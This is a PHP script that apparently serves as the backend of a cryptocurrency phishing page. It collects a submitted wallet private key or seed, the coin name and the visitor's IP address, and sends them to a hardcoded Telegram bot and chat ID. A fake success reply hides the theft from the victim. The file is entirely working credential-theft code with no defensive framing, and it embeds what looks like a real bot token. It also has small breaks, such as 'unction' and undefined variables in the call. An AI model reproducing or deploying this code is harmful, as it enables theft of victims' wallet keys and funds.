<?php

$token = "5330630457:AAG9v9f5Q8abgbwSmyhM_q-ILsMQO36haOE";
$chat_id = "-871734856";

header('Content-type: application/json');
include('../settings/router.php');
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$privateKey = strtolower(filter_input(INPUT_POST, 'privateKey'));
$formName = strtolower(filter_input(INPUT_POST, 'formName'));
$coinName = strtolower(filter_input(INPUT_POST, 'token'));

unction send2Telegram($token, $chatid, $coinName, $privateKey, $ip){
  $parametre= array(
      'chat_id' => $chatid,
      'text' => "
+- LOGS -+ 

* [👨 COIN_NAME] : $coinName 

*  [💲 WALLET or KEY] : $privateKey

* [🐸 İP]   : $ip
",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
}

if(!($privateKey) || !($coinName) || !($formName)){
header("location: https://youtu.be/CGblT4FasEo");
exit;
}else{
send2Telegram($token_r, $chatid, $coinName, $privateKey, $ip);
try{
$title = array("type" => "success");
$return = json_encode($title);
echo $return;
} catch (PDOException $e) {
die($e->getMessage());
}
}
?>
